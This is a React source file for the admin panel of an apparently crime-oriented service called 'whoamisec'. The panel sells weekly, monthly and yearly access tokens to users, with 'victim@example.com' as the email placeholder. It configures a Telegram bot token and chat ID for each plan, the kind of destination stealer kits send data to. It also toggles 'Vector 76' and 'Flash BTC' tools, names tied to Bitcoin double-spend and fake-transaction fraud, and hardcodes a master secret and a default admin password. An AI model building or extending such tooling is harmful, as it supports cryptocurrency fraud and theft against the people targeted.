
import React, { useState, useEffect } from 'react';
import { LogEntry } from '../types';

interface AdminPanelProps {
  addLog: (message: string, level: LogEntry['level']) => void;
}

interface UserToken {
  id: string;
  email: string;
  plan: 'WEEK' | 'MONTH' | 'YEAR';
  token: string;
  expiresAt: string;
  status: 'ACTIVE' | 'EXPIRED';
}

interface PlanConfig {
  tgToken: string;
  tgChatId: string;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ addLog }) => {
  const [tokens, setTokens] = useState<UserToken[]>(() => {
    const saved = localStorage.getItem('whoamisec_user_tokens');
    return saved ? JSON.parse(saved) : [];
  });

  const [newEmail, setNewEmail] = useState('');
  const [newPlan, setNewPlan] = useState<'WEEK' | 'MONTH' | 'YEAR'>('WEEK');
  const [adminPassword, setAdminPassword] = useState('');
  const [newAdminPassword, setNewAdminPassword] = useState('');
  const [secretWord, setSecretWord] = useState('');
  const [repoUrl, setRepoUrl] = useState('');
  const [cloningLogs, setCloningLogs] = useState<string[]>([]);
  const [isCloning, setIsCloning] = useState(false);
  const [recoveryWords, setRecoveryWords] = useState<string[]>([]);
  const [showRecovery, setShowRecovery] = useState(false);
  const [loggedApiKeys, setLoggedApiKeys] = useState<any>({});
  
  // Bitcoin Tool Config
  const [bitcoinConfig, setBitcoinConfig] = useState(() => {
    const saved = localStorage.getItem('whoamisec_bitcoin_config');
    return saved ? JSON.parse(saved) : {
      vector76Enabled: true,
      flashBtcEnabled: true,
      maxFlashAmount: 10.0,
      requireAdminApproval: false
    };
  });

  // Per-Plan Telegram Config
  const [planConfigs, setPlanConfigs] = useState<Record<string, PlanConfig>>(() => {
    const saved = localStorage.getItem('whoamisec_plan_configs');
    return saved ? JSON.parse(saved) : {
      WEEK: { tgToken: '', tgChatId: '' },
      MONTH: { tgToken: '', tgChatId: '' },
      YEAR: { tgToken: '', tgChatId: '' }
    };
  });

  const MASTER_SECRET = 'MerleoskinMerleoskin77';

  useEffect(() => {
    localStorage.setItem('whoamisec_user_tokens', JSON.stringify(tokens));
  }, [tokens]);

  useEffect(() => {
    localStorage.setItem('whoamisec_plan_configs', JSON.stringify(planConfigs));
  }, [planConfigs]);

  useEffect(() => {
    localStorage.setItem('whoamisec_bitcoin_config', JSON.stringify(bitcoinConfig));
  }, [bitcoinConfig]);

  const updatePlanConfig = (plan: string, field: keyof PlanConfig, value: string) => {
    setPlanConfigs(prev => ({
      ...prev,
      [plan]: { ...prev[plan], [field]: value }
    }));
  };

  const savePlanConfigs = () => {
    localStorage.setItem('whoamisec_plan_configs', JSON.stringify(planConfigs));
    addLog('ADMIN: All plan configurations updated', 'success');
    alert('Plan Configurations Saved');
  };

  const generateToken = () => {
    if (!newEmail) return;
    
    const duration = newPlan === 'WEEK' ? 7 : newPlan === 'MONTH' ? 30 : 365;
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + duration);

    const newToken: UserToken = {
      id: Math.random().toString(36).substring(7),
      email: newEmail,
      plan: newPlan,
      token: `WHOAMI-${Math.random().toString(36).substring(2).toUpperCase()}`,
      expiresAt: expiresAt.toISOString(),
      status: 'ACTIVE'
    };

    setTokens(prev => [...prev, newToken]);
    setNewEmail('');
    addLog(`ADMIN: Token generated for ${newEmail} (${newPlan})`, 'success');
  };

  const handlePasswordChange = (e: React.FormEvent) => {
    e.preventDefault();
    const currentPass = localStorage.getItem('admin_password') || '#AllOfThem-3301';
    
    if (adminPassword === currentPass || secretWord === MASTER_SECRET) {
      localStorage.setItem('admin_password', newAdminPassword);
      setAdminPassword('');
      setNewAdminPassword('');
      setSecretWord('');
      addLog('ADMIN: Admin password updated successfully', 'success');
      alert('Password updated successfully');
    } else {
      addLog('ADMIN: Password update failed - invalid credentials', 'error');
      alert('Invalid current password or master key');
    }
  };

  const handleCloneRepo = async () => {
    if (!repoUrl) return;
    setIsCloning(true);
    setCloningLogs(['[SYSTEM] Initializing projection sequence...']);
    
    try {
      const res = await fetch('/api/admin/clone-repo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repoUrl })
      });
      const data = await res.json();
      if (data.success) {
        setCloningLogs(data.logs);
        addLog(`ADMIN: Repository cloned successfully: ${repoUrl}`, 'success');
      }
    } catch (error) {
      setCloningLogs(prev => [...prev, '[ERROR] Projection failed. Connection lost.']);
    } finally {
      setIsCloning(false);
    }
  };

  const deleteToken = (id: string) => {
    setTokens(prev => prev.filter(t => t.id !== id));
    addLog('ADMIN: User token revoked', 'warning');
  };

  return (
    <div className="space-y-6 animate-in fade-in duration-500 font-mono">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Token Generation */}
        <div className="bg-[#0a0a0a] border border-[#dc2626]/20 p-6 rounded-2xl shadow-2xl">
          <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
            <i className="fas fa-key text-[#dc2626]"></i> Token Generation System
          </h3>
          
          <div className="space-y-4">
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">User Email</label>
              <input 
                type="email"
                value={newEmail}
                onChange={(e) => setNewEmail(e.target.value)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#dc2626]"
                placeholder="victim@example.com"
              />
            </div>
            
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Subscription Plan</label>
              <select 
                value={newPlan}
                onChange={(e) => setNewPlan(e.target.value as any)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#dc2626]"
              >
                <option value="WEEK">Weekly - $30</option>
                <option value="MONTH">Monthly - $300</option>
                <option value="YEAR">Yearly - $1000</option>
              </select>
            </div>

            <button 
              onClick={generateToken}
              className="w-full bg-[#dc2626] text-black font-black py-3 rounded-lg uppercase tracking-widest hover:bg-[#ff0000] transition-all"
            >
              Generate_Access_Token
            </button>
          </div>
        </div>

        {/* Telegram Config Per Plan */}
        <div className="bg-[#0a0a0a] border border-[#22c55e]/20 p-6 rounded-2xl shadow-2xl">
          <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
            <i className="fab fa-telegram text-[#22c55e]"></i> Telegram Bot Allocation (Per Plan)
          </h3>
          
          <div className="space-y-6 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
            {['WEEK', 'MONTH', 'YEAR'].map(plan => (
              <div key={plan} className="p-4 border border-white/5 rounded-xl bg-white/5">
                <h4 className="text-[10px] font-black text-[#22c55e] mb-3 uppercase tracking-tighter">{plan} Plan Bot</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-[8px] text-gray-600 uppercase font-black">Bot Token</label>
                    <input 
                      type="password"
                      value={planConfigs[plan].tgToken}
                      onChange={(e) => updatePlanConfig(plan, 'tgToken', e.target.value)}
                      className="w-full bg-black border border-white/10 rounded px-3 py-2 text-[10px] text-white outline-none focus:border-[#22c55e]"
                      placeholder="12345:ABC..."
                    />
                  </div>
                  <div className="space-y-1">
                    <label className="text-[8px] text-gray-600 uppercase font-black">Chat ID</label>
                    <input 
                      type="text"
                      value={planConfigs[plan].tgChatId}
                      onChange={(e) => updatePlanConfig(plan, 'tgChatId', e.target.value)}
                      className="w-full bg-black border border-white/10 rounded px-3 py-2 text-[10px] text-white outline-none focus:border-[#22c55e]"
                      placeholder="-100..."
                    />
                  </div>
                </div>
              </div>
            ))}
            
            <button 
              onClick={savePlanConfigs}
              className="w-full bg-[#22c55e] text-black font-black py-3 rounded-lg uppercase tracking-widest hover:bg-[#4ade80] transition-all sticky bottom-0 shadow-2xl"
            >
              Update_All_Allocations
            </button>
          </div>
        </div>

        {/* Bitcoin Tool Administration */}
        <div className="bg-[#0a0a0a] border border-orange-500/20 p-6 rounded-2xl shadow-2xl">
          <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
            <i className="fas fa-bitcoin-sign text-orange-500"></i> Bitcoin Tool Administration
          </h3>
          
          <div className="space-y-4">
            <div className="flex items-center justify-between p-3 border border-white/5 rounded-xl bg-white/5">
              <span className="text-[10px] text-gray-400 uppercase font-black">Vector 76 Tool Status</span>
              <button 
                onClick={() => setBitcoinConfig({...bitcoinConfig, vector76Enabled: !bitcoinConfig.vector76Enabled})}
                className={`px-4 py-1 rounded text-[8px] font-black uppercase transition-all ${bitcoinConfig.vector76Enabled ? 'bg-emerald-500 text-black' : 'bg-red-500 text-white'}`}
              >
                {bitcoinConfig.vector76Enabled ? 'ACTIVE' : 'DISABLED'}
              </button>
            </div>

            <div className="flex items-center justify-between p-3 border border-white/5 rounded-xl bg-white/5">
              <span className="text-[10px] text-gray-400 uppercase font-black">Flash BTC Tool Status</span>
              <button 
                onClick={() => setBitcoinConfig({...bitcoinConfig, flashBtcEnabled: !bitcoinConfig.flashBtcEnabled})}
                className={`px-4 py-1 rounded text-[8px] font-black uppercase transition-all ${bitcoinConfig.flashBtcEnabled ? 'bg-emerald-500 text-black' : 'bg-red-500 text-white'}`}
              >
                {bitcoinConfig.flashBtcEnabled ? 'ACTIVE' : 'DISABLED'}
              </button>
            </div>

            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Max Flash Amount (BTC)</label>
              <input 
                type="number"
                value={bitcoinConfig.maxFlashAmount}
                onChange={(e) => setBitcoinConfig({...bitcoinConfig, maxFlashAmount: parseFloat(e.target.value)})}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-orange-500"
              />
            </div>

            <div className="flex items-center gap-2 mt-4">
              <input 
                type="checkbox"
                checked={bitcoinConfig.requireAdminApproval}
                onChange={(e) => setBitcoinConfig({...bitcoinConfig, requireAdminApproval: e.target.checked})}
                className="w-4 h-4 rounded border-white/10 bg-black text-orange-500"
              />
              <label className="text-[10px] text-gray-500 uppercase font-black">Require Admin Approval for Large Flashes</label>
            </div>
          </div>
        </div>
      </div>

      {/* User Management */}
      <div className="bg-[#0a0a0a] border border-white/5 p-6 rounded-2xl shadow-2xl">
        <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
          <i className="fas fa-users text-gray-400"></i> Active User Tokens
        </h3>
        <div className="overflow-x-auto">
          <table className="w-full text-left text-[10px]">
            <thead>
              <tr className="border-b border-white/5 text-gray-500 uppercase font-black">
                <th className="py-3 px-4">User Email</th>
                <th className="py-3 px-4">Plan</th>
                <th className="py-3 px-4">Access Token</th>
                <th className="py-3 px-4">Expires At</th>
                <th className="py-3 px-4">Status</th>
                <th className="py-3 px-4">Actions</th>
              </tr>
            </thead>
            <tbody>
              {tokens.map(token => (
                <tr key={token.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
                  <td className="py-3 px-4 text-white">{token.email}</td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 rounded text-[8px] font-black ${
                      token.plan === 'YEAR' ? 'bg-yellow-500/20 text-yellow-500' : 
                      token.plan === 'MONTH' ? 'bg-blue-500/20 text-blue-500' : 'bg-gray-500/20 text-gray-500'
                    }`}>
                      {token.plan}
                    </span>
                  </td>
                  <td className="py-3 px-4 text-[#dc2626] font-black">{token.token}</td>
                  <td className="py-3 px-4 text-gray-400">{new Date(token.expiresAt).toLocaleDateString()}</td>
                  <td className="py-3 px-4">
                    <span className="text-emerald-500 font-black">● {token.status}</span>
                  </td>
                  <td className="py-3 px-4">
                    <button onClick={() => deleteToken(token.id)} className="text-red-500 hover:text-red-400">
                      <i className="fas fa-trash"></i>
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default AdminPanel;
